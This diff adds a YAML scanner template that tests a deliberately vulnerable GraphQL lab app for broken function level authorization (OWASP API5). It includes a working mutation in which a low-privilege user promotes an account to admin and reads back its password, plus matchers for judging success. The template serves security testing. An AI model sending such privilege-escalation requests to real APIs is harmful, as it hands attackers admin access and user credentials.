@@ -1,0 +1,60 @@
+# API5:2023 Broken Function Level Authorization - vulnerable-graphql promoteUser Mutation
+#
+# The promoteUser mutation changes any account's role but performs NO
+# authorization check. A low-privilege attacker can invoke this admin-only
+# function to escalate their own account (or anyone else's) to admin.
+#
+# Success criteria: a lower-privilege attacker calls promoteUser and the
+# mutation succeeds (HTTP 200, data.promoteUser populated, no errors).
+
+id: api5-bfla-promote-user
+info:
+  name: "vulnerable-graphql - BFLA via promoteUser Admin Mutation"
+  category: "API5:2023 Broken Function Level Authorization"
+  severity: "CRITICAL"
+  author: "hadrian"
+  description: |
+    Tests for Broken Function Level Authorization (BFLA) in the promoteUser
+    mutation. promoteUser is an administrative function that changes a user's
+    role, but it does not verify the caller holds the admin role. A
+    low-privilege user can therefore invoke it to escalate privileges —
+    a classic BFLA on an admin mutation.
+  tags: ["graphql", "owasp", "owasp-api-top10", "vulnerable-graphql", "bfla", "authorization", "privilege-escalation", "mutation"]
+  requires_llm_triage: false
+  test_pattern: "simple"
+
+endpoint_selector:
+  requires_auth: true
+
+role_selector:
+  attacker_permission_level: "lower"
+  victim_permission_level: "higher"
+
+graphql:
+  - query: |
+      mutation PromoteSelf {
+        promoteUser(username: "user2", role: "admin") {
+          id
+          username
+          password
+        }
+      }
+    auth: "attacker"
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["promoteUser", "username"]
+        part: body
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: body_field
+      body_field: "data.promoteUser.username"
+      exists: true
+    - type: body_field
+      body_field: "errors"
+      exists: false
+  vulnerability_pattern: "vulnerable_graphql_bfla_promote_user"
